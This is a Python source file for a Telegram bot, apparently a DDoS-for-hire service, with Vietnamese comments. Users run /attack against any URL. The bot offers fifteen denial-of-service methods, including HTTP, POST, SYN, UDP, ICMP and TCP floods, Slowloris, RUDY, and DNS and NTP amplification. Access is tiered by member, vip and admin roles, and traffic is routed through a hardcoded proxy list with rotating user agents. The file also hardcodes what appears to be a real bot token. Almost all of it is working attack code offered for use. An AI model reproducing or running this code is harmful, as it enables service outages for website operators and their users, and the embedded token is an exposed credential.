import json
import logging
import threading
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import random
import time
import socket
import urllib.parse
import ssl
import re
import struct
import asyncio
import os
from datetime import datetime, timedelta
from http.client import HTTPConnection
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import time
import random
import os
from colorama import init, Fore

init(autoreset=True)

colors = [
    Fore.RED,
    Fore.GREEN,
    Fore.YELLOW,
    Fore.BLUE,
    Fore.MAGENTA,
    Fore.CYAN,
    Fore.WHITE
]

text = time

def rainbow_flash(text, delay=0.1):
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        for char in text:
            color = random.choice(colors)
            print(color + char, end="", flush=True)
        time.sleep(delay)

time=time.strftime("%Y - %m - %d  %H:%M")
# Cấu hình logging
logging.basicConfig(
    filename=f'logs_{datetime.now().strftime("%Y%m%d")}.txt',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='a'
)

# Giới hạn kích thước file log (10MB)
handler = logging.FileHandler(f'logs_{datetime.now().strftime("%Y%m%d")}.txt')
handler.setLevel(logging.INFO)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
if os.path.exists(handler.baseFilename) and os.path.getsize(handler.baseFilename) > 10 * 1024 * 1024:
    handler.close()
    os.rename(handler.baseFilename, f"{handler.baseFilename}.bak")
logging.getLogger('').addHandler(handler)

# Cấu hình cơ bản
BOT_TOKEN = '7654153980:AAG8IzkwSXO0nfemPZtALyt60dkjKUh4zeU'
ADMIN_IDS = [6031289574]
PROXY_LIST = [
    "103.111.225.40:1080", "103.164.96.174:1080", "142.54.239.1:4145",
    "51.158.154.173:3128", "104.223.135.178:10000", "98.162.25.23:4145",
    "45.91.93.166:3128", "64.225.8.82:9988", "192.111.135.18:18301",
    "203.19.38.58:1080", "185.199.229.156:7492", "159.203.61.169:3128",
    "45.91.92.168:1080", "146.59.199.175:80", "192.252.208.67:14287",
    "185.199.228.156:7492", "64.225.4.19:9999", "185.199.231.45:8381",
    "107.172.153.157:3128", "104.248.63.17:30588"
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A107F)", "Mozilla/5.0 (Windows NT 10.0; Win64)",
    "Dalvik/2.1.0 (Linux; U; Android 10)", "okhttp/4.9.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
    "Mozilla/5.0 (Linux; Android 10; V2027)", "curl/7.64.1", "Wget/1.20.3 (linux-gnu)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 12)",
    "Opera/9.80 (Android; Opera Mini/36.2.2254/191.203; U; en) Presto/2.12.423",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6)",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A205U)",
    "Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X)", "PostmanRuntime/7.28.4",
    "Apache-HttpClient/4.5.2 (Java/1.8.0_181)"
]

# Danh sách phương thức tấn công với sức mạnh tối đa
METHODS = {
    'HTTP-FLOOD': {'role': 'member', 'duration': 600, 'threads': 3000, 'description': 'Tấn công HTTP Flood siêu mạnh'},
    'HTTPS-FLOOD': {'role': 'member', 'duration': 600, 'threads': 3500, 'description': 'Tấn công HTTPS Flood siêu mạnh'},
    'BYPASS': {'role': 'vip', 'duration': 900, 'threads': 4000, 'description': 'Tấn công Bypass vượt qua bảo vệ tối ưu'},
    'SLOWLORIS': {'role': 'vip', 'duration': 900, 'threads': 4500, 'description': 'Tấn công Slowloris giữ kết nối lâu'},
    'UDP-FLOOD': {'role': 'admin', 'duration': 1200, 'threads': 6000, 'description': 'Tấn công UDP Flood siêu mạnh'},
    'SYN-FLOOD': {'role': 'admin', 'duration': 1200, 'threads': 8000, 'description': 'Tấn công SYN Flood làm đầy bảng kết nối'},
    'POST-FLOOD': {'role': 'vip', 'duration': 900, 'threads': 4000, 'description': 'Tấn công POST Flood với dữ liệu ngẫu nhiên'},
    'CC': {'role': 'vip', 'duration': 900, 'threads': 4500, 'description': 'Tấn công Connection Crash siêu mạnh'},
    'DNS-AMP': {'role': 'admin', 'duration': 1200, 'threads': 6000, 'description': 'Tấn công khuếch đại DNS'},
    'NTP-AMP': {'role': 'admin', 'duration': 1200, 'threads': 6000, 'description': 'Tấn công khuếch đại NTP'},
    'HTTP2-FLOOD': {'role': 'vip', 'duration': 900, 'threads': 4000, 'description': 'Tấn công HTTP/2 Flood siêu mạnh'},
    'RUDY': {'role': 'vip', 'duration': 900, 'threads': 4500, 'description': 'Tấn công RUDY với POST chậm'},
    'TCP-FLOOD': {'role': 'admin', 'duration': 1200, 'threads': 7000, 'description': 'Tấn công TCP Flood siêu mạnh'},
    'ICMP-FLOOD': {'role': 'admin', 'duration': 1200, 'threads': 6000, 'description': 'Tấn công ICMP Flood siêu mạnh'},
    'SLOW-POST': {'role': 'vip', 'duration': 900, 'threads': 4500, 'description': 'Tấn công Slow POST siêu mạnh'}
}

# ---------------- Kiểm tra và sửa file database ----------------
def validate_db():
    try:
        with open('database.json', 'r') as f:
            data = json.load(f)
        if not isinstance(data, dict):
            logging.error("Invalid database format, resetting to empty dict")
            data = {}
            save_db(data)
        return data
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.warning(f"Database file error: {str(e)}, creating new")
        data = {}
        save_db(data)
        return data

def load_db():
    try:
        return validate_db()
    except Exception as e:
        logging.error(f"Failed to load database: {str(e)}")
        return {}

def save_db(db):
    try:
        with open('database.json.bak', 'w') as f:
            json.dump(db, f, indent=4)  # Sao lưu trước khi ghi
        with open('database.json', 'w') as f:
            json.dump(db, f, indent=4)
    except Exception as e:
        logging.error(f"Failed to save database: {str(e)}")

def get_role(user_id):
    try:
        db = load_db()
        user_id = str(user_id)  # Đảm bảo user_id là chuỗi
        user_data = db.get(user_id)
        if not user_data or not isinstance(user_data, dict):
            user_data = {'role': 'member', 'admin_expiry': None}
            db[user_id] = user_data
            save_db(db)
        role = user_data['role']
        expiry = user_data.get('admin_expiry')
        if role == 'admin' and expiry:
            try:
                if isinstance(expiry, str) and expiry != 'Không có':
                    if datetime.fromisoformat(expiry) < datetime.now():
                        user_data['role'] = 'member'
                        user_data['admin_expiry'] = None
                        db[user_id] = user_data
                        save_db(db)
            except ValueError as e:
                logging.error(f"Invalid expiry format for user_id {user_id}: {str(e)}")
                user_data['admin_expiry'] = None
                db[user_id] = user_data
                save_db(db)
        return user_data['role']
    except Exception as e:
        logging.error(f"Error in get_role for user_id {user_id}: {str(e)}")
        return 'member'

def set_role(user_id, role, duration_days=None):
    try:
        db = load_db()
        user_id = str(user_id)  # Đảm bảo user_id là chuỗi
        user_data = db.get(user_id, {'role': 'member', 'admin_expiry': None})
        if not isinstance(user_data, dict):
            user_data = {'role': 'member', 'admin_expiry': None}
        user_data['role'] = role
        if role == 'admin' and duration_days:
            try:
                user_data['admin_expiry'] = (datetime.now() + timedelta(days=int(duration_days))).isoformat()
            except ValueError:
                logging.error(f"Invalid duration_days: {duration_days}")
                user_data['admin_expiry'] = None
        else:
            user_data['admin_expiry'] = None
        db[user_id] = user_data
        save_db(db)
    except Exception as e:
        logging.error(f"Error in set_role for user_id {user_id}: {str(e)}")

# ---------------- Kiểm tra proxy hoạt động ----------------
async def check_proxy(proxy):
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
            start_time = time.time()
            async with session.get('http://ipinfo.io/ip', proxy=f'http://{proxy}', timeout=1) as response:
                latency = (time.time() - start_time) * 1000
                return latency < 500  # Chỉ giữ proxy có độ trễ < 500ms
    except Exception as e:
        logging.warning(f"Proxy {proxy} failed: {str(e)}")
        return False

async def get_active_proxies():
    try:
        tasks = [check_proxy(proxy) for proxy in PROXY_LIST]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        active_proxies = [proxy for proxy, result in zip(PROXY_LIST, results) if result is True]
        if not active_proxies:
            logging.error("No active proxies available")
        return active_proxies
    except Exception as e:
        logging.error(f"Error in get_active_proxies: {str(e)}")
        return []

# ---------------- Kiểm tra trạng thái web ----------------
async def check_website_status(url):
    if not re.match(r'^https?://', url):
        url = 'http://' + url
    if not urllib.parse.urlparse(url).netloc:
        logging.error(f"Invalid URL: {url}")
        return {'status': 'Invalid URL', 'latency': 0, 'is_alive': False, 'server': 'Unknown'}

    active_proxies = await get_active_proxies()
    if not active_proxies:
        return {'status': 'No active proxies', 'latency': 0, 'is_alive': False, 'server': 'Unknown'}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        for proxy in random.sample(active_proxies, len(active_proxies)):
            for _ in range(3):  # Thử lại tối đa 3 lần
                try:
                    start_time = time.time()
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    async with session.get(url, headers=headers, proxy=f'http://{proxy}', timeout=1) as response:
                        latency = (time.time() - start_time) * 1000
                        return {
                            'status': response.status,
                            'latency': round(latency, 2),
                            'is_alive': response.status == 200,
                            'server': response.headers.get('Server', 'Unknown')
                        }
                except Exception as e:
                    logging.warning(f"Proxy {proxy} failed for URL {url}: {str(e)}")
        return {'status': 'Error', 'latency': 0, 'is_alive': False, 'server': 'Unknown'}

# ---------------- Hàm tấn công ----------------
async def http_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive'
                }
                tasks.append(session.get(f"{url}?{random.randint(1, 1000000)}", headers=headers, proxy=proxy, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def https_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                tasks.append(session.get(url, headers=headers, proxy=proxy, timeout=1, ssl=False))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def bypass(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Cache-Control': 'no-cache',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                tasks.append(session.get(f"{url}?{random.randint(1, 1000000)}", headers=headers, proxy=proxy, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def slowloris(url, duration, threads):
    sockets = []
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    port = 443 if parsed_url.scheme == 'https' else 80
    try:
        for _ in range(int(threads)):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if parsed_url.scheme == 'https':
                s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sockets.append(s)
        while time.time() < end_time:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(s)
            await asyncio.sleep(1)
    except Exception as e:
        logging.error(f"Slowloris error: {str(e)}")
    finally:
        for s in sockets:
            s.close()

async def udp_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    port = 80
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(16384), (host, port))
                s.close()
            except Exception as e:
                logging.warning(f"UDP-FLOOD error: {str(e)}")
        await asyncio.sleep(0.001)

async def syn_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    port = 80
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            except Exception as e:
                logging.warning(f"SYN-FLOOD error: {str(e)}")
            finally:
                s.close()
        await asyncio.sleep(0.001)

async def post_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                data = {f'key{random.randint(1, 1000)}': random.randint(1, 10000)}
                tasks.append(session.post(url, headers=headers, proxy=proxy, data=data, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def cc_attack(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                tasks.append(session.get(f"{url}?{random.randint(1, 1000000)}", headers=headers, proxy=proxy, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def dns_amp(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x01', (host, 53))
                s.close()
            except Exception as e:
                logging.warning(f"DNS-AMP error: {str(e)}")
        await asyncio.sleep(0.001)

async def ntp_amp(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'\x17\x00\x03\x2a\x00\x00\x00\x00', (host, 123))
                s.close()
            except Exception as e:
                logging.warning(f"NTP-AMP error: {str(e)}")
        await asyncio.sleep(0.001)

async def http2_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                for _ in range(3):  # Thử lại tối đa 3 lần
                    try:
                        headers = {'User-Agent': random.choice(USER_AGENTS)}
                        tasks.append(session.get(f"https://{host}/?{random.randint(1, 1000000)}", headers=headers, timeout=1))
                        break
                    except Exception as e:
                        logging.warning(f"HTTP2-FLOOD retry error: {str(e)}")
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

async def rudy(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(random.randint(50000, 100000))
                }
                tasks.append(session.post(url, headers=headers, proxy=proxy, data='a=' + 'x' * 50000, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.01)

async def tcp_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    port = 443 if parsed_url.scheme == 'https' else 80
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(random._urandom(16384))
                s.close()
            except Exception as e:
                logging.warning(f"TCP-FLOOD error: {str(e)}")
        await asyncio.sleep(0.001)

async def icmp_flood(url, duration, threads):
    end_time = time.time() + int(duration)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.netloc
    while time.time() < end_time:
        for _ in range(int(threads)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + random._urandom(256)
                s.sendto(packet, (host, 1))
                s.close()
            except Exception as e:
                logging.warning(f"ICMP-FLOOD error: {str(e)}")
        await asyncio.sleep(0.001)

async def slow_post(url, duration, threads):
    end_time = time.time() + int(duration)
    active_proxies = await get_active_proxies()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        while time.time() < end_time:
            tasks = []
            for _ in range(int(threads)):
                proxy = f'http://{random.choice(active_proxies)}' if active_proxies else None
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '100000'
                }
                tasks.append(session.post(url, headers=headers, proxy=proxy, data='a=' + 'x' * 100000, timeout=1))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.01)

# ---------------- Hàm tấn công đa luồng ----------------
def attack_thread(url, method, duration, threads):
    method_functions = {
        'HTTP-FLOOD': http_flood,
        'HTTPS-FLOOD': https_flood,
        'BYPASS': bypass,
        'SLOWLORIS': slowloris,
        'UDP-FLOOD': udp_flood,
        'SYN-FLOOD': syn_flood,
        'POST-FLOOD': post_flood,
        'CC': cc_attack,
        'DNS-AMP': dns_amp,
        'NTP-AMP': ntp_amp,
        'HTTP2-FLOOD': http2_flood,
        'RUDY': rudy,
        'TCP-FLOOD': tcp_flood,
        'ICMP-FLOOD': icmp_flood,
        'SLOW-POST': slow_post
    }
    try:
        import asyncio
        asyncio.run(method_functions[method](url, duration, threads))
        logging.info(f"Attack completed successfully: {url} with {method} ({duration}s, {threads} threads)")
    except Exception as e:
        logging.error(f"Attack thread failed: {url} with {method} ({duration}s, {threads} threads) - Error: {str(e)}")
        raise

def start_attack(url, method, duration, threads):
    max_threads = min(int(threads), 8000)  # Giới hạn tối đa để tránh crash
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(max_threads):
            executor.submit(attack_thread, url, method, duration, threads)

# ---------------- Bot Commands ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            "👋 Chào mừng đến với Bot Attack v7.0 (Max Power)!\n"
            "📌 Lệnh cơ bản:\n"
            "- /attack <url> <method> - Bắt đầu tấn công ngay\n"
            "- /methods - Xem danh sách phương thức\n"
            "- /check <url> - Kiểm tra trạng thái website\n"
            "- /setrole <id> <role> [days] - Cập nhật quyền (admin only)\n"
            "- /info - Xem thông tin cá nhân\n"
            "- /checkuser <id> - Kiểm tra thông tin người dùng (admin only)"
        )
    except Exception as e:
        logging.error(f"Error in start command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /start. Vui lòng thử lại.")

async def methods(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = "📌 Danh sách phương thức tấn công:\n"
        for method, info in METHODS.items():
            msg += f"• {method} - Quyền: {info['role'].upper()} - Thời gian: {info['duration']}s - Luồng: {info['threads']} - {info['description']}\n"
        await update.message.reply_text(msg)
    except Exception as e:
        logging.error(f"Error in methods command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /methods. Vui lòng thử lại.")

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) != 1:
            return await update.message.reply_text("❗ Dùng: /check <url>")
        
        url = context.args[0]
        status = await check_website_status(url)
        msg = f"🔍 Kiểm tra website: {url}\n"
        msg += f"• Trạng thái: {status['status']}\n"
        msg += f"• Độ trễ: {status['latency']}ms\n"
        msg += f"• Server: {status['server']}\n"
        msg += f"• Trạng thái: {'Online' if status['is_alive'] else 'Offline'}"
        await update.message.reply_text(msg)
    except Exception as e:
        logging.error(f"Error in check command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /check. Vui lòng thử lại.")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        username = update.effective_user.username or "NoUsername"
        db = load_db()
        user_data = db.get(user_id, {'role': 'member', 'admin_expiry': None})
        if not isinstance(user_data, dict):
            user_data = {'role': 'member', 'admin_expiry': None}
            db[user_id] = user_data
            save_db(db)
        role = user_data['role']
        expiry = user_data.get('admin_expiry', 'Không có')
        if expiry and isinstance(expiry, str) and expiry != 'Không có':
            try:
                expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M:%S")
            except ValueError:
                logging.warning(f"Invalid expiry format for user_id {user_id}, setting to 'Không có'")
                expiry = 'Không có'
        await update.message.reply_text(
            f"📋 Thông tin người dùng:\n"
            f"• ID: {user_id}\n"
            f"• Username: {username}\n"
            f"• Quyền: {role}\n"
            f"• Hết hạn admin: {expiry}"
        )
    except Exception as e:
        logging.error(f"Error in info command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /info. Vui lòng thử lại.")

async def checkuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMIN_IDS:
            return await update.message.reply_text("⛔ Bạn không có quyền sử dụng lệnh này.")
        
        if len(context.args) != 1:
            return await update.message.reply_text("❗ Dùng: /checkuser <user_id>")
        
        user_id = context.args[0]
        db = load_db()
        user_data = db.get(user_id, {'role': 'member', 'admin_expiry': None})
        if not isinstance(user_data, dict):
            user_data = {'role': 'member', 'admin_expiry': None}
            db[user_id] = user_data
            save_db(db)
        role = user_data['role']
        expiry = user_data.get('admin_expiry', 'Không có')
        if expiry and isinstance(expiry, str) and expiry != 'Không có':
            try:
                expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M:%S")
            except ValueError:
                logging.warning(f"Invalid expiry format for user_id {user_id}, setting to 'Không có'")
                expiry = 'Không có'
        await update.message.reply_text(
            f"📋 Thông tin người dùng:\n"
            f"• ID: {user_id}\n"
            f"• Quyền: {role}\n"
            f"• Hết hạn admin: {expiry}"
        )
    except Exception as e:
        logging.error(f"Error in checkuser command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /checkuser. Vui lòng thử lại.")

async def setrole(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMIN_IDS:
            return await update.message.reply_text("⛔ Bạn không có quyền sử dụng lệnh này.")

        if len(context.args) < 2:
            return await update.message.reply_text("❗ Dùng: /setrole <id> <role> [days]")

        user_id, role = context.args[:2]
        duration_days = context.args[2] if len(context.args) > 2 else None
        if role not in ['member', 'vip', 'admin', 'banned']:
            return await update.message.reply_text("❗ Role không hợp lệ: member, vip, admin, banned")

        set_role(user_id, role, duration_days)
        expiry_msg = f", hết hạn sau {duration_days} ngày" if duration_days and role == 'admin' else ""
        await update.message.reply_text(f"✅ Đã cập nhật quyền {role} cho ID {user_id}{expiry_msg}")
    except Exception as e:
        logging.error(f"Error in setrole command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /setrole. Vui lòng thử lại.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = context.args
        if len(args) != 2:
            return await update.message.reply_text("❗ Dùng: /attack <url> <method>")

        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        role = get_role(user_id)
        url, method = args
        method = method.upper()

        if role == "banned":
            return await update.message.reply_text("🚫 Bạn đã bị cấm sử dụng bot.")

        if method not in METHODS:
            return await update.message.reply_text("❗ Phương thức không tồn tại. Dùng /methods để xem danh sách.")

        method_info = METHODS[method]
        required_role = method_info['role']
        duration = method_info['duration']
        threads = method_info['threads']

        role_rank = {"banned": 0, "member": 1, "vip": 2, "admin": 3}
        if role_rank[role] < role_rank[required_role]:
            return await update.message.reply_text("⛔ Bạn không đủ quyền để dùng phương thức này.")

        # Ghi log và gửi thông báo đang thực hiện
        log_entry = f"{username}({user_id}) bắt đầu tấn công {url} với {method} ({duration}s, {threads} luồng)"
        logging.info(log_entry)
        await update.message.reply_text(
            f"⏳ Đang thực hiện lệnh tấn công...\n"
            f"• URL: {url}\n"
            f"• Phương thức: {method}\n"
            f"• Thời gian: {duration}s\n"
            f"• Luồng: {threads}\n"
            f"• User: {username} ({user_id})\n"
            f"• Quyền: {role}"
        )

        # Bắt đầu tấn công
        try:
            start_attack(url, method, duration, threads)
            await update.message.reply_text(
                f"✅ Tấn công thành công!\n"
                f"• URL: {url}\n"
                f"• Phương thức: {method}\n"
                f"• Thời gian: {duration}s\n"
                f"• Luồng: {threads}\n"
                f"• User: {username} ({user_id})\n"
                f"• Quyền: {role}"
            )
        except Exception as e:
            logging.error(f"Attack failed: {url} with {method} ({duration}s, {threads} threads) - Error: {str(e)}")
            await update.message.reply_text(
                f"❌ Tấn công thất bại: {str(e)}\n"
                f"• URL: {url}\n"
                f"• Phương thức: {method}\n"
                f"• Thời gian: {duration}s\n"
                f"• Luồng: {threads}\n"
                f"• User: {username} ({user_id})\n"
                f"• Quyền: {role}"
            )
    except Exception as e:
        logging.error(f"Error in attack command: {str(e)}")
        await update.message.reply_text("❌ Lỗi khi thực hiện lệnh /attack. Vui lòng thử lại.")

# ---------------- Chạy Bot ----------------
if __name__ == "__main__":
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("methods", methods))
        app.add_handler(CommandHandler("check", check))
        app.add_handler(CommandHandler("setrole", setrole))
        app.add_handler(CommandHandler("info", info))
        app.add_handler(CommandHandler("checkuser", checkuser))

        print("🤖 Bot Attack v7.0 (Max Power) is running...")
        print("Thời Gian Hiện Tại Là : " ,time)
        app.run_polling()
    except Exception as e:
        logging.error(f"Bot failed to start: {str(e)}")